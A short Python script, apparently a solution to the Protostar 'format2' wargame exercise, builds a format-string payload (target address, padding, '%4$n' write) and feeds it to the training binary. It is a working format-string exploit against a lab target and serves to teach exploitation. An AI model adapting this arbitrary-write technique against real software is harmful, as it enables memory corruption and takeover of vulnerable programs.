import subprocess

program = "/opt/protostar/bin/format2"
target = "\x08\x04\x96\xe4"[::-1]
extra = '%.'+str(64-len(target))+'d'

string = target+extra+"%4$n"
print(repr(string))

process = subprocess.Popen([program, string], stdin=subprocess.PIPE)
process.communicate(string+'\n');




